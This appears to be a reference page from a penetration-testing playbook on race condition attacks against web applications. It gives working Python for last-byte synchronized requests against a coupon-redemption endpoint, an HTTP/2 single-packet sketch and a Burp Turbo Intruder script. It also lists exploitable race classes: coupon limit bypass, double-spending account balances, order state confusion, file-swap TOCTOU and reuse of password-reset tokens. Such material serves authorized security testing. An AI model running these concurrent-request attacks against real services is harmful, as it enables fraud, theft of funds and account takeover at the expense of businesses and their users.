# Race Condition Attack Techniques

## When to Use

Consult when preparing to execute concurrent requests in Phase 2.

---

## Single-Packet Attack (HTTP/1.1)

### Last-Byte Synchronization

The most effective technique for HTTP/1.1:

```python
import socket
import ssl
import threading

target = "target.com"
port = 443
request = b"POST /api/redeem-coupon HTTP/1.1\r\nHost: target.com\r\nContent-Length: 20\r\nCookie: session=...\r\n\r\n{\"code\":\"SAVE50\"}"

# Split: everything except last byte, and last byte
request_body = request[:-1]
last_byte = request[-1:]

connections = []
N = 50

# Step 1: Open N connections and send everything except last byte
for i in range(N):
    ctx = ssl.create_default_context()
    sock = ctx.wrap_socket(socket.socket(), server_hostname=target)
    sock.connect((target, port))
    sock.send(request_body)
    connections.append(sock)

# Step 2: Send all last bytes simultaneously
def send_last(conn, byte):
    conn.send(byte)

threads = [threading.Thread(target=send_last, args=(c, last_byte)) for c in connections]
for t in threads:
    t.start()
for t in threads:
    t.join()

# Step 3: Read all responses
for c in connections:
    response = c.recv(4096)
    print(response[:200])
    c.close()
```

### Why This Works
TCP Nagle's algorithm and network buffering cause regular parallel requests to arrive with gaps. By pre-sending everything except the last byte, all connections are "loaded" — sending the last bytes simultaneously triggers all requests at once.

---

## HTTP/2 Single-Connection Attack

HTTP/2 multiplexes streams over one connection. All requests in one TCP packet:

```python
# Using h2 library
import h2.connection
import h2.config
import socket, ssl

# Create single HTTP/2 connection
config = h2.config.H2Configuration()
conn = h2.connection.H2Connection(config=config)
conn.initiate_connection()

# Create N streams with the same request
for i in range(50):
    stream_id = conn.get_next_available_stream_id()
    conn.send_headers(stream_id, headers=[...])
    conn.send_data(stream_id, body, end_stream=True)

# Send ALL frames in one TCP write
sock.sendall(conn.data_to_send())
```

All 50 requests arrive in a single TCP packet → maximum concurrency.

---

## Burp Suite Turbo Intruder

```python
# Turbo Intruder script for race conditions
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          requestsPerConnection=50,
                          pipeline=False)
    
    for i in range(50):
        engine.queue(target.req, gate='race')
    
    engine.openGate('race')  # Release all 50 simultaneously

def handleResponse(req, interesting):
    if '200' in req.response:
        table.add(req)
```

The `gate` parameter holds all requests until `openGate()` releases them at once.

---

## Types of Race Conditions

### 1. Limit Bypass (Most Common)
```
Condition: user.coupon_uses < max_uses
Action: increment user.coupon_uses, apply discount
Race: 50 requests all read coupon_uses=0, all pass check, all increment
Result: coupon applied 50 times
```

### 2. Double-Spend
```
Condition: user.balance >= transfer_amount
Action: deduct balance, credit recipient
Race: N transfers of full balance, all read the same balance
Result: N × balance transferred, actual balance goes negative
```

### 3. State Confusion
```
Condition: order.status == "pending"
Action: set status to "processing", begin fulfillment
Race: simultaneously change status to "cancelled" AND "processing"
Result: order is both cancelled and processing → undefined behavior
```

### 4. File Race (TOCTOU)
```
Step 1: Upload file → validation (check it's an image)
Step 2: File is processed/stored
Race: Replace the validated file with malicious file between steps 1 and 2
```

### 5. Token/Nonce Race
```
Condition: reset_token.used == false
Action: set used = true, allow password change
Race: N requests with same token, all read used=false
Result: Token used N times
```
